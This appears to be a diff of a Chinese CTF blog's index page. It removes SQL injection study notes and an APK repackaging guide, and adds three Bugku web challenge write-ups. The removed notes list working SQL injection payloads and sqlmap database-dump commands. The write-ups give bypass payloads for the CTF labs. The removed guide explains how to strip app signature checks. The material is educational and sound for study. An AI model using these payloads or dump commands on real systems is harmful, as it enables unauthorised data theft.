+      <a class="article-title" href="/2021/08/09/bugku-web-never-give-up/">bugku-web-never_give_up</a>
     </h1>
   
 
@@ -724,52 +651,34 @@
         
 
 
-<a href="/2021/07/26/sql%E6%B3%A8%E5%85%A5%E7%AC%94%E8%AE%B0/" class="archive-article-date">
-  	<time datetime="2021-07-26T12:25:02.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2021-07-26</time>
+<a href="/2021/08/09/bugku-web-never-give-up/" class="archive-article-date">
+  	<time datetime="2021-08-09T12:05:01.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2021-08-09</time>
 </a>
         
       </header>
     
     <div class="article-entry" itemprop="articleBody">
       
-        <p>sql这玩意，语法也不难，但是特别容易忘，这已经是我第三次从零开始学习sql注入了，做点笔记，希望别那么快又忘了。</p>
-<p>参考视频：deelmind大佬的sql注入教程<a target="_blank" rel="noopener" href="https://www.bilibili.com/video/BV1Ab4y1k7e7">https://www.bilibili.com/video/BV1Ab4y1k7e7</a><br>（舟长赛高）</p>
-<hr>
-<h2 id="1-找可能的注入点"><a href="#1-找可能的注入点" class="headerlink" title="1.找可能的注入点"></a>1.找可能的注入点</h2><p>不止需要get输入的地方可能被数据库录入，连数据包的各个参数都有可能被数据库录入，所以可以改变所有的参数，逐个进行测试</p>
-<hr>
-<h2 id="2-四种注入检测"><a href="#2-四种注入检测" class="headerlink" title="2.四种注入检测"></a>2.四种注入检测</h2><p>报错注入（error）：<br>例：id=3’ AND EXTRACTVALUE(1389,CONCAT(0x5c,0x7170766a71,(SELECT (ELT(1389=1389,1))),0x7170627671)) AND ‘GzOm’=’GzOm</p>
-<p>联合注入（union）：<br>例：id=-4195’ UNION ALL SELECT NULL,NULL,CONCAT(0x7170766a71,0x61626345484d4c44715053567a486d7064415a77696d7076417055786962707664624d4a41455146,0x7170627671)– -</p>
-<p>时间盲注（time）（特征：网页加载了一段时间）：<br>例：id=3’ AND (SELECT 7586 FROM (SELECT(SLEEP(5)))ljtK) AND ‘NBox’=’NBox</p>
-<p>布尔盲注（boolean）：<br>例：id=3’ AND 3931=3931 AND ‘IMwH’=’IMwH</p>
-<hr>
-<h2 id="3-nmap简单使用："><a href="#3-nmap简单使用：" class="headerlink" title="3.nmap简单使用："></a>3.nmap简单使用：</h2><p>扫描：<br>python sqlmap.py -u “[url]” -random-agent(一般扫描)（后参数可省略）<br>如果有自己写的tamper（这里用safedog.py代替）扫描：<br>python sqlmap.py -u “[url]” -random-agent –tamper = safedog.py</p>
-<p>比较好使的sqlmap中文参考手册：<a href="/download/sqlmap%E6%89%8B%E5%86%8C.jpeg">点击下载</a></p>
-<p>查看所有数据库：<br>python sqlmap.py -u “[url]” –dbs</p>
-<p>查看某数据库的所有表（库名用security代替）：<br>python sqlmap.py -u “[url]” -D security –tables</p>
-<p>查看某表的所有列（库名用security代替，表名用user代替）：<br>python sqlmap.py -u “[url]” -D security -T users –columns</p>
-<p>查看某列的所有数据（库名用security代替，表名用user代替，列名用username代替）：python sqlmap.py -u “[url]” -D security -T users -C username –dump</p>
-<p>（最简便）查看所有数据库的所有数据（一般别用，会把基础库全部打印出来）：python sqlmap.py -u “[url]” –dump-all<br>（最简便）查看某数据库的所有数据：python sqlmap.py -u “[url]” -D security –dump-all</p>
-<p>cookie注入：（在sqlmap中使用cookie注入，level &gt;=2才行）<br>sqlmap.py -u “ <a target="_blank" rel="noopener" href="http://www./*/*/*.com/shownews.asp&quot;">http://www.\*\*\*.com/shownews.asp&quot;</a> –cookie=”id=207” –level 2</p>
-<p>user-agent注入：（level &gt;= 4）<br>sqlmap.py -u “ <a target="_blank" rel="noopener" href="http://www./*/*/*.com/shownews.asp&quot;">http://www.\*\*\*.com/shownews.asp&quot;</a> –random-agent  –level 3</p>
-<p>referer注入：（level &gt;= 4）<br>python sqlmap.py -u “<a target="_blank" rel="noopener" href="http://challenge-a3f5f8ae8e1fa13b.sandbox.ctfhub.com:10800/&quot;">http://challenge-a3f5f8ae8e1fa13b.sandbox.ctfhub.com:10800/&quot;</a> –referer=”aaaaa” –level 4</p>
-<p>绕过空格拦截的12个脚本（<a target="_blank" rel="noopener" href="https://www.cnblogs.com/i-honey/p/7899652.html%EF%BC%89">https://www.cnblogs.com/i-honey/p/7899652.html）</a></p>
+        <p>查看源代码，发现1p.html<br>访问1p.html，发现直接重定向到了论坛。</p>
+<p>改为bp抓包，拦截让页面卡在跳转页面<br>查看源代码，发现一些url代码</p>
+<img src="/2021/08/09/bugku-web-never-give-up/1.PNG" class="" title="1.PNG">
 
+<p>拿到bp里解码（强烈建议bp加码，方便解这种套娃）<br>连续进行url，base64，url解码后得到一段并不完整的php代码</p>
+<img src="/2021/08/09/bugku-web-never-give-up/2.PNG" class="" title="2.PNG">
+<img src="/2021/08/09/bugku-web-never-give-up/3.PNG" class="" title="3.PNG">
+<img src="/2021/08/09/bugku-web-never-give-up/4.PNG" class="" title="4.PNG">
 
-<p>常用temper介绍：<a target="_blank" rel="noopener" href="https://www.cnblogs.com/mark0/p/12349551.html">https://www.cnblogs.com/mark0/p/12349551.html</a></p>
-<hr>
-<h2 id="5-mysql基础语法"><a href="#5-mysql基础语法" class="headerlink" title="5.mysql基础语法"></a>5.mysql基础语法</h2><p>注释：<br>（1） – (后面带空格)<br>（2） /*  */<br>（3） # （mysql特有）</p>
-<p>搜索：<br>select * from [表名] where id=1<br>      “*“ 可以换成列名或数字（例：id,username,1,2,3）(若为列名，则会搜索那一列，若为数字，则会自动填充到每一列，若数字个数比列数多，则会报错)<br>      “id=1”为条件，可以更换<br>select distinct ……(去重)<br>…… where id between 1 and 2 = …… where id in (1,2) （可用于绕过id=3 ==&gt; id in (3))<br>…… where id=1 and 1=1 (一定为真)（and可以用&amp;或&amp;&amp;代替）<br>…… where id=1 or 1=11 (一定为真)（or可以用|或||代替）</p>
-<p>like：<br>select …… where pass like “%pass%”<br>(匹配pass列中符合”%pass%”的元素)（类似正则表达式，%：代表0或多个字符，_:代表一个字符）</p>
-<p>order by（排序）：<br>select * from duser order by id limit 3<br>(id可以是列名或数字（第几列），可以用于测试一共有几列)<br>(limit 3 意思是看前几条，若数字大于总条数，则显示所有)</p>
-<p>as（重命名）：<br>select id as s from ……<br>(把列名为id的一列的列名改成s输出，as可以省略)</p>
-<p>函数：<br>max()  (最大) 例： select min(id) from ……<br>min()  (最小)<br>sum()  (求和)<br>count()  (个数)<br>concat()  (拼接)<br>database()  (数据库名)  例： select database()<br>user()  (主机名（相当于主机名和密码）)<br>@@datadir  (存储位置)</p>
-<p>exists():<br>select 1 and exists(select 2)<br>(若括号内返回真，则返回前面select的值；若为假，则返回0)（相当于if）</p>
-<p>ascii():<br>返回字符串首个字母的ascii码<br>可以配合exists()使用: select * from duser where id=1 and exists(select * from duser 1 where ascii(username)=117)<br>(username为列名，117代表字母u)（只有正确才会返回值，可以用来测试内容）</p>
-<p>substring(,,):<br>截取字段，可配合ascii爆出内容<br>ascii(substring(username,1,1))==117<br>(上述例子的意思是，若第二个字母为u)</p>
-<p>union:<br>select * from duser union select * from duser1<br>(后一个*可以换成1,2,3或1,2,database()，可以用来查表名之类的)<br>union自动去重<br>不要去重可以用 union all</p>
-<p>group by(分组):<br>select count(username)count,id,username,pass from duser group bu id (having count=5)<br>（测试同id的username有几个）<br>(括号内为可加，查有5个的id，username，pass)</p>
-<p>最基础绕过:加/**/</p>
-<p>join部分以后再整理</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">if(!$_GET[&#39;id&#39;])</span><br><span class="line">&#123;</span><br><span class="line">	header(&#39;Location: hello.php?id&#x3D;1&#39;);</span><br><span class="line">	exit();</span><br><span class="line">&#125;</span><br><span class="line">$id&#x3D;$_GET[&#39;id&#39;];</span><br><span class="line">$a&#x3D;$_GET[&#39;a&#39;];</span><br><span class="line">$b&#x3D;$_GET[&#39;b&#39;];</span><br><span class="line">if(stripos($a,&#39;.&#39;))&#x2F;&#x2F;参数a中不能带.字符</span><br><span class="line">&#123;</span><br><span class="line">	echo &#39;no no no no no no no&#39;;</span><br><span class="line">	return ;</span><br><span class="line">&#125;</span><br><span class="line">$data &#x3D; @file_get_contents($a,&#39;r&#39;);&#x2F;&#x2F;读取参数a的文件内容并赋值给data</span><br><span class="line">if($data&#x3D;&#x3D;&quot;bugku is a nice plateform!&quot; and $id&#x3D;&#x3D;0 and strlen($b)&gt;5 and eregi(&quot;111&quot;.substr($b,0,1),&quot;1114&quot;) and substr($b,0,1)!&#x3D;4)</span><br><span class="line">&#x2F;&#x2F;data等于&quot;bugku is a nice plateform!&quot;，id等于0，b的长度要大于5，“111”连接b的第0个字符要等于&quot;1114&quot;，b的第0个字符要不等于4</span><br><span class="line">&#123;</span><br><span class="line">	$flag &#x3D; &quot;flag&#123;***********&#125;&quot;</span><br><span class="line">&#125;</span><br><span class="line">else</span><br><span class="line">&#123;</span><br><span class="line">	print &quot;never never never give up !!!&quot;;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<p>参考：<a target="_blank" rel="noopener" href="https://www.cnblogs.com/OHuooo/p/14670610.html">https://www.cnblogs.com/OHuooo/p/14670610.html</a></p>
+<p>首先是id<br>这里用到的是PHP中的0e绕过，由于PHP是弱类型语言，在数字开头的字符串与数字进行弱类型比较==时，会用第一个非数字之前的字符转化成数字后与数字进行比较。</p>
+<p>题目中要求id不能为0或者false，同时id==0，因此可以使用弱类型绕过。让id=0e123456</p>
+<p>关于a<br>这里使用php伪协议，绕过file_get_contents()函数，所以a=php://input，然后使用POST方法传递bugku is a nice plateform!即可</p>
+<p>关于b<br>题中要求b的第0个字符不为4，但是又要求第0个字符与”111”拼接之后弱等于”1114”。</p>
+<p>这里应该联想到正则表达式，让b以通配符*开头，且长度大于5</p>
+<p>所以可以让b=*123456</p>
+<img src="/2021/08/09/bugku-web-never-give-up/5.PNG" class="" title="5.PNG">
+<p>得到flag</p>
 
       
 
@@ -782,7 +691,7 @@
 
       
         <p class="article-more-link">
-          <a class="article-more-a" href="/2021/07/26/sql%E6%B3%A8%E5%85%A5%E7%AC%94%E8%AE%B0/">展开全文 >></a>
+          <a class="article-more-a" href="/2021/08/09/bugku-web-never-give-up/">展开全文 >></a>
         </p>
       
 
@@ -834,14 +743,14 @@
     </section>
   
   
-    <article id="post-记一次拆包fhx" class="article article-type-post  article-index" itemscope itemprop="blogPost">
+    <article id="post-bugku-web-cookies" class="article article-type-post  article-index" itemscope itemprop="blogPost">
   <div class="article-inner">
     
       <header class="article-header">
         
   
     <h1 itemprop="name">
-      <a class="article-title" href="/2021/07/19/%E8%AE%B0%E4%B8%80%E6%AC%A1%E6%8B%86%E5%8C%85fhx/">记一次拆包fhx</a>
+      <a class="article-title" href="/2021/08/09/bugku-web-cookies/">bugku-web-cookies</a>
     </h1>
   
 
@@ -849,40 +758,20 @@
         
 
 
-<a href="/2021/07/19/%E8%AE%B0%E4%B8%80%E6%AC%A1%E6%8B%86%E5%8C%85fhx/" class="archive-article-date">
-  	<time datetime="2021-07-19T11:37:10.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2021-07-19</time>
+<a href="/2021/08/09/bugku-web-cookies/" class="archive-article-date">
+  	<time datetime="2021-08-09T10:14:31.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2021-08-09</time>
 </a>
         
       </header>
     
     <div class="article-entry" itemprop="articleBody">
       
-        <p>以前的经历，新方法出现后我就删掉了，在这里做个备份，以供自己未来参考</p>
-<p>这贴包括一部分技术介绍，最简便教程可以移步——<br>简易fhx教程（最简单步骤贴）_伊甸园的骄傲wiki_伊甸园的骄傲 _Gamekee游戏攻略百科<br>（不过还是希望看一下，你会发现真没你想的那么高深）</p>
-<p>环境所限，希望大家自己看看就行，别大肆宣传</p>
-<p>相比于国内另外几个游戏，说实话这个游戏的fhx是最没技术含量的。（下面两段以及免责是吹水，单纯找步骤的人可以略过）</p>
-<p>参考碧蓝是需要读代码把FALSE改成true，少前是对定期数据加密的解密，双生是靠替换密码加密以及代码审计找到官方留的后门。<br>这个是最简单的（不然也不可能让我这个啥也不会的菜鸡一天就干出来）</p>
-<p>这个游戏只需要单纯的——“换图”<br>（就算提取图片也并没有到加密的难度，简单密码学入门的话可以先不看答案当一道ctf题做一下，看不懂这句话请自动略过当我没说）</p>
-<p>好嘞，下面是喜闻乐见的“免责”环节：（找步骤的人可以略过整个免责环节）<br>    1.首先，如果我的文章侵犯了您的合法权益，请务必联系攻略组，我马上就删。严正声明：仅供用于学习关于安卓编程最弱智基础以及unity3d的最基础入门，严禁用作商业用途，后果自负！（我也会在题后进行简单的技术讨论，为大佬们开发更加简易的方法做个铺垫，以及起到互相学习的目的）<br>    2.因为改包本来就存在风险，更何况还涉及封装，所以请谨慎对待（主要是我也不确定有什么风险，毕竟我又菜又没经验）<br>    3.建议不要使用别人给的apk，原因有二，首先，这并不像一个文件式补丁包那样很轻易的就能人工审查出问题（木马，病毒），这种二次封装好的apk很容易报“风险”，但一般人会忽视直接安装，也有些二次封装软件为了成功安装而强制把比较危险的东西加载成看起来安全的样子，即使手机检测也未必能检测出来，这就给个别另有所图的人留下可乘之机。所以最安全的软件只有官网和出自自己之手的。其次，整这玩意真挺简单的，又不需要读代码改参数，也没有加密，就是动动手指的事。因此，我大概不会发布我的apk（更大的原因是我更希望这个游戏能平安运营到几年后，毕竟游戏公司也不是闲的才花两倍的钱拿一倍的立绘，包括现在我也是希望热度别这么快就下去了，大家互相体谅，各个论坛也平和一点，都挺无奈的）。<br>    4.补充：因为普通立绘和限定立绘的存储方式不同，以及现在游戏还不涉及限定立绘，所以限定立绘部分先不考虑（其实那部分是个人就能轻松做到）。<br>    5.可能：不排除大更新后需要重新来一遍的可能。这甚至可能会导致每次大更新都要重新下载apk。（主要是我也不确定）</p>
-<p>ok，咱们开始——（写完发现前两段还是吹水，步骤可以跳到“下面我就直接说步骤了：“那里）</p>
-<p>步骤可以参考这位大佬的图（我觉得写得挺好的，简单易懂）——</p>
-<p>看不懂也没关系，这并不是什么高深的东西，其实fhx一共分为简单的四步——<br>1.把日服的apk（快递）下过来，拆开包，拿出图片。<br>2.把国服apk的（快递）下过来，拆开包。<br>3.把日服的图片扔进国服的包，然后把包封上口。<br>4.最后在封口上面签两个名，顺便撕掉收件信息就行了。<br>（相当于什么都没说）</p>
-<p>下面我就直接说步骤了：（下面括号里为技术讨论，大家自行略过就行）<br>1.把日服的apk（快递）下过来，拆开包，拿出图片。<br>这一步我就替大家做了（但是提的不全）——<br><a target="_blank" rel="noopener" href="https://ouroborosscr.github.io/2021/07/17/rad/">https://ouroborosscr.github.io/2021/07/17/rad/</a><br>我随便找了个云盘上发了个文件夹，直接下来就好了（建议放到手机的“我的手机/Download”文件下，别放根目录（Android））<br>我也不用云盘了，太麻烦，直接上传到我的博客了，博客上有些多余的东西，也没什么意思，大家自动忽略就行（只要github不倒闭，这玩意就不会封）<br>（关于这部分，这个文件和apk不一样，一眼就能看出是图片，也可以随便解包查看内容，内容也不多，随便一个大佬就能看出有没有问题，所以安全性可以保证，当然最安全的还是自己制作）</p>
-<p>（也可以自己提取，并不难，就是有点麻烦，已经下载好的同学请自动略过跳到第二步）<br>现在介绍的就是我制作上面那个文件夹的过程：想办法下载一个日服的安装包（比如从apkssr），下载下来是这样的（你会得到两个文件——xxx.apk和xxx.obb<br>在手机上重命名xxx.obb为xxx.zip,然后在手机上解压缩（注意：重命名和解压缩必须在手机上，电脑上会解不出东西）</p>
-<p>打开解压缩的文件夹，打开assets/ResEX文件，里面一大堆xxx.aab文件就包含立绘了<br>根据编号找到自己要替换的文件，复制到别的文件夹里（建议在Download文件下）</p>
-<p>以下是我自己对比得出的需要替换的文件名（非常不全）：<br>格式为st_img_xxxxxxxxxx.abb的文件：（中间的xxxxxxxxxx替换成下面的数字）<br>11100004_1<br>11100004_2<br>11100006_2<br>11101006_2<br>11200003_1<br>11200003_2<br>11200006_1（但我觉得hx版好看）<br>11200006_2<br>11201003_1<br>11201003_2<br>11201004_2（过分！）<br>11202001_2<br>11300002_1<br>11300002_2（其实不修也不会想成那个吧）<br>11300003_1<br>11300003_2（修了好看，不修有点奇怪）<br>11300004_1<br>11300004_2<br>11300005_1<br>11300005_2<br>11301003_1<br>11301003_2<br>11301004_2（所以说，hx的标准一直都挺迷的）<br>11301005_1<br>11301005_2<br>格式为m_l2d_xxxxxxxx.abb的文件：<br>11100004<br>11101004<br>11202001<br>11300002</p>
-<p>11300003<br>11300004<br>11300005<br>11300004<br>11300005<br>11301003<br>11301004<br>（感谢nga的大佬指出我统计的错误）</p>
-<p>（题外话：对比了一晚上，一开始我还觉得hx的挺多的，从那么多文件里就只有这么几个要换，对比半天才能找出一个，官方真的很良心了）<br>（三阶形态因为就算拆包，图也对比不出来什么（下文技术讨论阶段会说原因），所以我仅靠自己的记忆列举了一下，如果有缺的请评论通知我）<br>（另外，我和另一个攻略组成员商量了一下，制作图鉴的时候把这个编号加上去，以后大家可以直接通过gamekee的图鉴搜索功能来获取立绘编号，便于大家直接提取和替换）</p>
-<p>2.把国服apk的（快递）下过来，拆开包。<br>这里需要用一个名叫“mt管理器”的软件，很难受的是——这个软件似乎是要钱的（20块钱三个月的会员）<br>（我一开始也尝试过用git上免费的apktool和uber-apksigner，奈何技术不行，绕不过证书验证，希望有大佬可以指点，下文技术讨论部分细说）<br>软件建议在官网下载——<br>MT管理器 (lanzoui.com)<br>（因为这种软件乱下载的话，十个里有九个有问题，甚至有把木马放到最外层一眼就能解出来的，甚至不排除“马中马”的可能）<br>下载以后点左上角“三”，点“安装包提取”，选择游戏，点“提取安装包”，提取完后点“定位”，就到了下图3的样子</p>
-<p>3.把日服的图片扔进国服的包，然后把包封上口。<br>点击apk，点击“查看”，打开asstes/ResEx文件夹，右边打开已经下载好的red文件（如果存在了download文件夹下，就点三下上面的”…”，点击打开”sdcard/download“就行了（似乎是个内存穿梭？），变成这个样子。</p>
-<p>点击右上角的三个竖点，点击”全选“，右边的文件就变蓝了，长按随便一个文件，点击”添加“，等会就行了</p>
-<p>4.最后在封口上面签两个名，顺便撕掉收件信息就行了。<br>然后左边翻到最上面点的“..”两下，退到apk界面，点击你的apk，发现”校验不通过“字样（这是由于证书签名被消除造成的）<br>点击“功能”，直接点击“去除签名校验”（这个功能自带签名，不要多此一举去签名）<br>（括号里可以略过，这就是使用这个软件的原因，单纯的v1，v2签都可以自己造（免费软件），但是这只能办到安装，打开游戏后会有证书验证造成你的软件闪退，现在我只发现这个软件可以绕过这些，如果有别的方法，希望大佬指点，下文技术讨论细说）<br>注意！！这里要关闭“使用加强版”，这个app真的不兼容<br>然后就可以安装了（要先把原软件卸载）（安那个带sign字样的，別安成原包了）<br>（注意，别用修改过的apk操作，第二次我在这里卡了将近一个小时（直接影响了发布时间），有兴趣可以读一下帮助文件，就明白原理了介绍 - MT管理器 (binmt.cc)，亲测：换成原装apk立马就通过了）</p>
-<p>效果图（官服废号，别来找我加好友）</p>
-<p>最后一点题外话：虽然这个封装的很弱智（盲猜是官方故意留下的后门？）害得我前两天都没怎么上过号，大号还维持在第一天的九级，完全远离了第一梯队，要替换的图也是我一个个人工绕过+对照的（一开始开文档统计确实容易被人拿去带节奏，被大佬提醒以后我就关了，给大家道个歉，我不该贪图省事的），就冲这费的功夫，你们要是不给我个成品号就太说不过去了。<br>ok，单纯想制作fhx软件的朋友们，你们已经可以退出网页开始游戏了。</p>
-<p>下面我们来点“好玩的”——简单的技术讨论，start！！<br>首先是立绘提取问题，官方直接用unity3d设计的立绘，所以图片就是所有的aab文件，感谢官方只是用添零来防提取，我一开始也是抱着学习“安卓安全”的想法去做的，其实拆这玩意还真的挺好玩的——<br>比如明明是日服，却看到一个图片名叫“juqingbaoxiang”，是的，就是拼音，并不是英文的“Story treasure chest”<br>还有，我挺好奇“xiaolizi”是啥，难道后面还有“fugui”吗？<br>开玩笑的，当时我以为是“栗子”，结果打开一看，竟然是一堆光晶碎片，所以，是“小粒子”<br>还有，为什么“shendan_shala”是山和天空啊！玄学命名法<br>另外就是，千万不要去看三阶的图片，因为你会看到你的lp们碎成一堆的诡异景象（辣眼睛）。是的，有几个关节能动就切几刀，特别是那种很多缕头发都在晃动的，简直的密恐的地狱，游戏越良心，碎的越彻底，从这方面讲，这游戏是真的良心——这也是我为什么没法通过对比得出哪些三阶立绘被hx的原因<br>还有就是偶尔会看见，一堆肉块杂乱的摆在图上（其实是装备的图片，但是连着肉那一部分，比如臂铠就是从肩到胳膊肘的部分）</p>
-<p>其实这个修改或许真的不是最优解，甚至是最差解也说不定，主要是我能力有限，权当抛砖引玉了吧，其实如果是该apk，利用太极之类的软件去完成两个apk拼接可能更好一些？没办法，我只会白嫖别人的拼接，真不会制作，希望有大佬能试着研究一下？</p>
-<p>关于这个过程中遇到的几个难点，就不得不提“证书签名”了（没办法，技术不过硬，连这种小问题都会被拦住）<br>单纯的拆包只用换zip再解压就行了，但是那就破坏了签名文件，我的理解，“签名文件”就相当于快递的封口贴纸，zip解压缩就是“暴力拆邮件”会破坏封纸（记载着包的信息和里面所有东西的位置），还会把里面的东西弄乱，导致再封起来的时候没法还原成原状。<br>这就导致zip文件改完后没法还原成apk的情况（当然能改文件名，但是根本没法下载）<br>所以要小心翼翼的把封纸完整的撕下来，等包装的时候再改一改贴上。<br>这里我一开始用的github上的apktool，终于算是能还原成可安装文件了。<br>但是安装的时候出了问题——签名不匹配。（过不了华为的初步检测）<br>然后我又用github上的uber-signer签的名（后来发现apktool也可以签名，甚至可以自造私钥签名）<br>终于可以点击“立刻安装”了，可是安好后却显示“没有证书”，就被华为直接删掉了。（我查了查，好像是2018年开始的，华为手机会对签名进行简答备案和验证，真麻烦！）<br>最后还是咨询了一些大佬推荐我用“mt管理器”，我发现这玩意是真方便！所有前几个软件在java环境下命令行运行的功能全被整理成了按键，所有功能一键搞定，据说制作者做这个软件的时候还是高中生，甚至还运营着论坛（MT论坛 - MT官网_MT管理器论坛_MT管理器_MT管理器教程_MT最新版本 (binmt.cc)），膜拜大佬！！bin大佬，yyds！！！<br>这才发现原来我只签了v1，没签v2。<br>据说apktool也能签v2，但我实在没弄明白，加上那个似乎没法私签？（还请明白的大佬指教）所以直接用“mt管理器”签了，好歹算是成功安装了。<br>终于打开游戏，但又遇到一个问题——闪退。<br>经过一些简单的修复和简单的审查内存以后，我发现闪退的时间点几乎都是第二个画面的时候，加上网上查了些资料，发现可能是在验证证书了。<br>还好发现了去证书验证功能，去看了帮助文件，似乎并不是真正的去除，而是把原证书逆向以后再签成新证书，这个功能是apktool没有的，现在我只知道mt管理器有这个功能，如果有逆向大佬可以手动逆向出来，或者有类似的处理软件，请务必不吝赐教，告诉我思路，提前谢谢大佬们！</p>
+        <p>打开后抓包<img src="/2021/08/09/bugku-web-cookies/1.PNG" class="" title="1.PNG"><br>把filename解码发现是keys.txt<br>试着把index.php用base64加密后放进去，改line的数值，发现从3开始有内容<br>出来，逐个复制出来是一个php代码</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">error_reporting(0);</span><br><span class="line">$file&#x3D;base64_decode(isset($_GET[&#39;filename&#39;])?$_GET[&#39;filename&#39;]:&quot;&quot;);</span><br><span class="line">$line&#x3D;isset($_GET[&#39;line&#39;])?intval($_GET[&#39;line&#39;]):0;</span><br><span class="line">if($file&#x3D;&#x3D;&#39;&#39;) header(&quot;location:index.php?line&#x3D;&amp;filename&#x3D;a2V5cy50eHQ&#x3D;&quot;);</span><br><span class="line">$file_list &#x3D; array(</span><br><span class="line">&#39;0&#39; &#x3D;&gt;&#39;keys.txt&#39;,</span><br><span class="line">&#39;1&#39; &#x3D;&gt;&#39;index.php&#39;,</span><br><span class="line">);</span><br><span class="line">if(isset($_COOKIE[&#39;margin&#39;]) &amp;&amp; $_COOKIE[&#39;margin&#39;]&#x3D;&#x3D;&#39;margin&#39;)&#123;       </span><br><span class="line">$file_list[2]&#x3D;&#39;keys.php&#39;;</span><br><span class="line">&#125;</span><br><span class="line">if(in_array($file, $file_list))&#123;</span><br><span class="line">$fa &#x3D; file($file);</span><br><span class="line">echo $fa[$line];</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
 
+<p>当cookie中的margin参数的值为margin时，就可以访问keys.php，所以在cookie加一个margin=margin<br>，然后把上面的文件名换成keys.php的base64加密形式a2V5cy5waHA=</p>
+<p>得到flag</p>
+<img src="/2021/08/09/bugku-web-cookies/2.PNG" class="" title="2.PNG">
       
 
       
@@ -894,7 +783,7 @@
 
       
         <p class="article-more-link">
-          <a class="article-more-a" href="/2021/07/19/%E8%AE%B0%E4%B8%80%E6%AC%A1%E6%8B%86%E5%8C%85fhx/">展开全文 >></a>
+          <a class="article-more-a" href="/2021/08/09/bugku-web-cookies/">展开全文 >></a>
         </p>
       
 
@@ -946,14 +835,14 @@
     </section>
   
   
-    <article id="post-rad" class="article article-type-post  article-index" itemscope itemprop="blogPost">
+    <article id="post-bugku-web-No-one-knows-regex-better-than-me" class="article article-type-post  article-index" itemscope itemprop="blogPost">
   <div class="article-inner">
     
       <header class="article-header">
         
   
     <h1 itemprop="name">
-      <a class="article-title" href="/2021/07/17/rad/">rad</a>
+      <a class="article-title" href="/2021/08/09/bugku-web-No-one-knows-regex-better-than-me/">bugku-web-No one knows regex better than me</a>
     </h1>
   
 
@@ -961,15 +850,22 @@
         
 
 
-<a href="/2021/07/17/rad/" class="archive-article-date">
-  	<time datetime="2021-07-17T05:10:49.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2021-07-17</time>
+<a href="/2021/08/09/bugku-web-No-one-knows-regex-better-than-me/" class="archive-article-date">
+  	<time datetime="2021-08-09T09:52:00.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2021-08-09</time>
 </a>
         
       </header>
     
     <div class="article-entry" itemprop="articleBody">
       
-        <p><a href="/download/rad.zip">点击下载</a></p>
+        <p>源码：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line">error_reporting(0);</span><br><span class="line">$zero&#x3D;$_REQUEST[&#39;zero&#39;];</span><br><span class="line">$first&#x3D;$_REQUEST[&#39;first&#39;];</span><br><span class="line">$second&#x3D;$zero.$first;</span><br><span class="line">if(preg_match_all(&quot;&#x2F;Yeedo|wants|a|girl|friend|or|a|flag&#x2F;i&quot;,$second))&#123;</span><br><span class="line">    $key&#x3D;$second;</span><br><span class="line">    if(preg_match(&quot;&#x2F;\.\.|flag&#x2F;&quot;,$key))&#123;</span><br><span class="line">        die(&quot;Noooood hacker!&quot;);</span><br><span class="line">    &#125;else&#123;</span><br><span class="line">        $third&#x3D;$first;</span><br><span class="line">        if(preg_match(&quot;&#x2F;\\|\056\160\150\x70&#x2F;i&quot;,$third))&#123;</span><br><span class="line">            $end&#x3D;substr($third,5);</span><br><span class="line">            highlight_file(base64_decode($zero).$end);&#x2F;&#x2F;maybe flag in flag.php</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">else&#123;</span><br><span class="line">    highlight_file(__FILE__);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>最大的难点在<code>preg_match(&quot;/\\|\056\160\150\x70/i&quot;,$third)</code>这句，因为php会自动把所有带<code>\</code>的转译，并且会转译到不能转移为止，所以这句话实际上是<code>preg_match(&quot;|.php/i&quot;,$third)</code></p>
+<p>这里构造payload我就直接利用他给的<code>|.php</code>构造了，所以为了绕过<code>substr($third,5)</code>,要在前面补四个字母，不能是flag所以只能选“girl”<br>所以前面就补一个base64加密后的“flag”，为ZmxhZw==<br>所以最后的payload为：?zero=ZmxhZw==&amp;first=girl|.php<br>得到flag</p>
+<img src="/2021/08/09/bugku-web-No-one-knows-regex-better-than-me/1.PNG" class="" title="1.PNG">
+
+<p>也可以把后面的全部消除掉，那么base64加密的就是flag.php（ZmxhZy5waHA=，因为正好有a，所以可以绕过上面的验证）<br>payload为：?zero=ZmxhZy5waHA=&amp;first=|.php</p>
 
       
 
@@ -982,7 +878,7 @@
 
       
         <p class="article-more-link">
-          <a class="article-more-a" href="/2021/07/17/rad/">展开全文 >></a>
